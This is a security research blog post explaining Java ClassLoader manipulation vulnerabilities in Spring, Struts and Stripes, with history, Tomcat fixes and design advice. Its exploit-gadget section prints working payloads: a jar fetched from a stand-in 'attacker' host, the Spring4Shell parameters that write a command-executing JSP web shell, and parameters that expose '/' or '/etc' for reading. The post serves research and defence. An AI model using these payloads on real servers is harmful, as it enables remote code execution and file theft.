---
layout: post
title:  "ClassLoader manipulation"
date:   2025-01-21 08:00:00 +0100
categories: "security research"
---

`ClassLoader` **manipulation** (also known as **pollution**,
or **poisoning**) is an group of exploit chains against Java
environments that insecurely expose access to
[ClassLoader](https://docs.oracle.com/javase/8/docs/api/java/lang/ClassLoader.html).

* [TL;DR](#tldr) - too long did not read. ClassLoader manipulation in just a few lines.
* [Root cause](#root-cause) - What causes ClassLoader manipulation vulnerabilities?
* [A unique vulnerability class](#a-unique-vulnerability-class) - I argue this is a very unique and interesting vulnerability!
* [Exploit gadgets](#exploit-gadgets) - different helpful gadgets for building ClassLoader manipulation exploit chains.
* [Important research](#important-research) - how did we get here, what are great resources for understanding the field?
* [Tomcat changes to ClassLoader](#tomcat-changes-to-classloader) - examples of reducing exploitability in future versions
* [Timeline](#timeline) - timeline of known exploits / vulnerabilities, etc.
* [Final words of wisdom](#final-words-of-wisdom) - something positive and clever, I hope!

## TL;DR

This is a vulnerability / exploit chain spanning several
different Java frameworks (Spring, Apache Struts, Stripes
Framework) and has been re-found over decades:

* **Spring**: *Meder Kydyraliev* originally found this in **2010**.
* **Spring**: `Spring4Shell`, a new `Java 9+` variant  was found
  in **2022**, by *codeplutos* and *meizjm3i* of *AntGroup FG
  Security Lab*, and also by *Praetorian*.
* **Struts**: I found this in **Apache Struts** in **2013**, fix
   released in 2014. Also independently found by *Przemysław Celej*.
  Numerous reporters found bypasses to the original fix,
  prompting further corrections.
* **Stripes Framework** fixed it in **2014**.

A typical ClassLoder manipulation exploit chain looks like this:

* Application uses a framework that exposes access to Object
  using introspection / reflection, Bean API, OGNL or similar.
* A gadget that reaches the ClassLoader is found, e.g.
  `class.classLoader` or `class.module.classLoader`.
* A gadget that makes the specific ClassLoader behave badly is
  utilized, e.g.
  * `class.classLoader.URLs[0]=...`
  * `class.classLoader.resources.context.parent.pipeline.first.pattern=jsp-shell`
  * `class.classLoader.resources.dirContext.docBase=/`

The exact exploit will depend a lot on the specific `ClassLoader`
that is reachable. If `URLs` or `resources` are not available, they
cannot be abused in an exploit.

**Potential good news**:
Latest versions of server applications may include mitigations
against well-known `ClassLoader` exploits, possibly rendering future
such exploits more difficult.

## Root cause

Why does these vulnerabilities exist, what causes them?

We typically see these vulnerabilities in Java frameworks (Spring,
Apache Struts, etc.) that are intended to enable simple access to
a Java objects; For example, in `UserNameBean` the application
developer only intends to expose `userName`.

``` java
public class UserNameBean {
  private String userName;
  public String getUserName() {
     return userName;
  }
  public void setUserName(String userName) {
    this.userName = userName;
  }
}
```

So the intended effect is that only `?userName=x` should be exposed
by the web framework or message handler. Nothing more.

However, an important Java idiosyncrasy is that all classes inherit
`java.lang.Object` class.
In my humble opinion is `java.lang.Object` is bad class, from various
perspectives; it includes several annoying dependencies you likely
did not want.

Importantly, it exposes the `getClass()` method, that returns a
a `java.lang.Class` object.
And a class object exposes `getClassLoader()` that returns a
`java.lang.ClassLoader`.

Now, importantly, a `ClassLoader` is a pretty low level thing that
is intended to build Java objects, and each Java environment has its
own `ClassLoader`. Numerous server environments has classloaders that
can affect the server in various ways.

While the intended usage was to enable access to `userName`, the
exploit instead accesses
`class.classLoader.resources.dirContext.docBase=/` or such,
fundamentally altering the server runtime

I love a **complicated mess** like this - it is a fundamental and
complicated problem that spans so many different layers and
developers. Depending on how you look at it, you can blame anyone;

* Application developers who want simple frameworks that turn input
  to objects, without any whitelisting or configuration?
* Frameworks that expose `java.lang.Object.getClass()` ?
* Frameworks that do not require a clear opt-in for methods to be
  externally accessible?
* Java? If `java.lang.Object` did not include
  `.getClass().getClassLoader()` and
  `.getClass().getModule.getClassLoader()` methods this class of
  problems would not exist.
* Server `ClassLoader` developers? If server developers assumed
  frameworks would enable access to `ClassLoader`, then this class
  needs to be free from dangerous setters and getters. Or make
  `ClassLoader` immutable before enabling application access.

## A unique vulnerability class

Is this possibly its own class of weaknesses?

I do not think there is a Common Weakness Enumeration (CWE) that
perfectly matches this type of vulnerability.
It is very similar to, but clearly distinct from Common Weakness
Enumeration 470,
[CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')](https://cwe.mitre.org/data/definitions/470.html)

In `CWE-470`, focus is on restricting reflection from accessing
arbitrary classes.
In ClassLoader manipulation, the reflection is "safe" but dangerous
getter `getClass()` in `java.lang.Object` enables stepping out to
the ClassLoader.

## Exploit gadgets

If you want to build an exploit chain,
you need a bunch of gadgets to chain together!

### Exploit gadgets: reaching the ClassLoader

The first step of a `ClassLoader` manipulation exploit is getting to
the `ClassLoader`! There are a few ways identified so far:

* `class.classLoader`
* `Class.classLoader` - some interpreters may be case insensitive.
* `class.module.classLoader` was introduced with Java 9,
  [Understanding Java 9 Modules](https://www.oracle.com/se/corporate/features/understanding-java-9-modules.html).
  That language update broke old exploit mitigation codes in various programs, it would seem!

You may of course try other variants in other frameworks.
If `userName` is accessible, maybe
`?userName=x&userName.class.classLoader` works?

### Exploit gadgets: executing code from ClassLoader

Load exploit gadgets using `URLs` (Meders original exploit):

``` plain
class.classLoader.URLs[0]=jar:http://attacker/spring-exploit.jar!/
```

Change where jar-files are loaded from:

``` plain
class.classLoader.jarPath=/tmp/exploit
```

### Exploit gadgets: dropping JSP backdoor

Spring4Shell exploit utilized
`resources.context.parent.pipeline.first` to access an
a logger (`org.apache.catalina.valves.AccessLogValve`) instance.

Then the exploits logs a JSP shell into `webapps/app` file directory,
from which the web server will later load JSP files from.
It is a very impressive and clever exploit chain, I am very impressed!

``` plain
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
  %{pre}i
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()
  %{colon}i
  int a = -1
  %{colon}i
  byte[] b = new byte[2048]
  %{colon}i
  while((a=in.read(b))!=-1){ out.println(new String(b))
  %{colon}i
  }
  %{post}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/app
class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

### Exploit gadgets: File reads via dirContext

[Glassfish/Payara exploit](https://snyk.io/blog/spring4shell-rce-vulnerability-glassfish-payara/):

``` plain
class.module.classLoader.resources.dirContext.docBase=/
```

`class.classLoader.resources.dirContext.aliases=` variant mentioned in
[github.com/lanjelot/kb/struts](https://github.com/lanjelot/kb/blob/master/struts):
``` plain
class.classLoader.resources.dirContext.aliases=/lol=/etc
```

### Exploit gadgets: JSP execution via dirContext

Another `dirContext` exploit gadget from [github.com/lanjelot/kb/struts](https://github.com/lanjelot/kb/blob/master/struts):

Code execution via aliases:
``` plain
class.classLoader.resources.dirContext.aliases=/blah=//192.168.122.1/share
```

Then exploit by loading an malicious JSP, e.g.
`http://127.0.0.1:8080/struts-mailreader/blah/rce.jsp`.

## Important research

### Meder Kydyraliev: initial 2010 research

Meders Troopers presentation from 2010 is just amazing:

[Meder Kydyraliev: Milking a horse or executing remote code in modern Java frameworks](https://troopers.de/media/filer_public/9b/e4/9be400c4-2d66-48f5-94df-fe23eb06b122/tr11_meder_milking_a_horse.pdf)

His CVE blog post on the initial Spring finding
([o0o.nu: cve-2010-1622](http://blog.o0o.nu/2010/06/cve-2010-1622.html)),
was also really great!

What is funny is that Meders attack on Spring could have been used
against **Apache Struts**, **Stripes framework**.

So in theory the `ClassLoader` issues could have been addressed
years earlier. The techniques and exploitation patterns were out
there, just waiting to be rediscovered.

### Julian Vilas: Help finding more exploit gadgets

Julian's presentation is extremely good:
* Video: [Julian Vilas: Deep inside the Java framework Apache Struts](https://www.youtube.com/watch?v=Q8xSHezCWgc)
* [SlideShare](https://www.slideshare.net/slideshow/deep-inside-the-java-framework-apache-struts/45525705)

Julian Vilas credits `neobytes` for techniques for finding useful
`ClassLoader` gadgets.
(The link to `neobytes` was dead at time of writing)

Julian released that automates search for `Classloader` gadgets, and
preliminary findings:
 [CVE-2014-0094 / CVE-2014-0114 Struts Tester](https://github.com/julianvilas/rooted2k15)
 _Additional materials for RootedCON 2015 Apache Struts talk_
it is is wonderful heap of knowledge.
Tester explores accessible `ClassLoader` properties under several different prominent
runtime environments such as:
* Tomcat 6 / 7 / 8
* Glassfish 4.1
* JBOSS 7.1 / 7.4
* WAS 8.5.5 (developer version)
* Weblogic 10.3 / 12.1

Importantly, some target environments have `ClassLoader` with known
easily exploitable gadgets. But some `ClassLoaders` do not.
So with knowledge of this vulnerability class, the exploits can be
mitigated at this point.

### My small contribution

In 2013 I had a lot of interest in frameworks, serialization, RMI,
and published attacks on related technologies
I did
[Serial Killers - or Deserialization for fun and profit](https://www.slideshare.net/slideshow/serialization-24936498/24936498)
presentation at a corporate event in 2013 looking at such issues.

In 2013 a customer had an **Apache Struts 2** application to be
penetration tested.
But due to various complications, the application was unavailable
for testing for several days.

I fired off [a question](https://x.com/blaufish_/status/327469277542244354)
to Meder Kydyraliev:

> "_have you investigated if struts2 is vulnerable to classloader_
> _pollution through ognl similar to your spring exploit?_"

And no, Meder had not tested this exploit technique against Struts.

I fired up a small Struts test environment, and to my surprise I was
able to pollute the `ClassLoader` easily.
My demo was a small hello world app showing that I could pollute
`class.classLoader.jarPath`, which seemed fairly serious to me.

So my effort was fairly limited - in my humble opinion this was an
issue left wide open since 2010.
Clearly most framework developers and whitehat hackers simply were
not aware of the techniques demonstrated by Meder Kydyraliev.

Issue was assigned `CVE-2014-0094` / `S2-020` and fixed about a year
later - Struts had a lot on its plate.

So a funny question: if attacks are moderately easy, and exploit
techniques have been well known for 4 years...
do we think attackers had been abusing the technique since 2010
against selected targets of interest? Or did attackers also miss
this?

## Tomcat changes to ClassLoader

If I check the Tomcat `WebappClassLoader` for changes, it seems like
several useful exploit gadgets has been removed.
Future exploiters will likely have a harder time attacking this class
of bugs, unless they find new interesting exploit gadgets!

``` bash
git diff ee2a461bcd7d61873b589309eddadb300faa4682..HEAD -- java/org/apache/catalina/loader/WebappClassLoader.java
```

`class.module.classLoader.resources` exploit gadgets removed:

``` diff
-    /**
-     * Get associated resources.
-     */
-    public DirContext getResources() {
-
-        return this.resources;
-
-    }
```

`class.classLoader.jarPath` exploit gadget removed:

``` diff
-    /**
-     * The path which will be monitored for added Jar files.
-     */
-    protected String jarPath = null;
```

``` diff
-    /**
-     * Change the Jar path.
-     */
-    public void setJarPath(String jarPath) {
-
-        this.jarPath = jarPath;
-
-    }
```

So, on a target running on latest server software, these gadgets are
gone.
A very good move disabling these exploit gadgets!

With the newer, more secure, `ClassLoader`, old exploits might fail,
even in the presence of vulnerable frameworks and applications!

## Timeline

* 2010-06 [o0o.nu: cve-2010-1622](http://blog.o0o.nu/2010/06/cve-2010-1622.html) Spring initial finding
  * _Parting thoughts:_
    _There's got to be more components out there that use class loader's URLs, which will make the attack easier than the one described above._
    _There's got to be a way to do something interesting with other_
    `class` _properties still exposed._
    _Spring's fix for this vulnerability was to blacklist_
    `classLoader` _property._
    _There's a lot more code out there that doesn't specify stop class, some of it has to have security implications._
* 2014-03 [Struts S2-020](https://cwiki.apache.org/confluence/display/WW/S2-020) security bulletin published.
  Partially fixes `ClassLoader` manipulation (`CVE-2014-0094`).
* 2014-04 [Stripes Framework fix](https://github.com/StripesFramework/stripes/commit/b4c043ce50f3f032abc47878cf70019db0675c7a)
* 2014-04 [metasploit-framework /struts\_code\_exec\_classloader.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts_code_exec_classloader.rb)
* 2014-04 [Struts S2-021](https://cwiki.apache.org/confluence/display/WW/S2-021) security bulletin published.
  Exploits bypassing the `S2-020` / `CVE-2014-0094` was found in the wild.
* 2015-03 [CVE-2014-0094 / CVE-2014-0114 Struts Tester](https://github.com/julianvilas/rooted2k15) Redsadic Julian Vilas _Additional materials for RootedCON 2015 Apache Struts talk_
* 2022-03 [Spring Framework RCE, Early Announcement (Spring4Shell)](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)

## Final words of wisdom

* Prefer simple plain objects.
  `POJO`, `DTO`, `Bean`, or whatever you like to call them.
  These exploits worked because `java.lang.Object` introduced
  unwanted additional features.
  In a **muddy design** where your data model objects also includes
  various other code, you could introduce similar issues that are
  application specific.
* Limit functionality on objects that could accidentally become
  externally facing, such as `ClassLoader`.
* Consider an **opt-in** whitelist feature instead of **expose
  everything** plus whitelist in future frameworks.
  Do not let external data pollute all fields by default.
  For java, maybe an `@WebExposed` annotation or similar could be
  used to mark a setter as available to the frameworks.

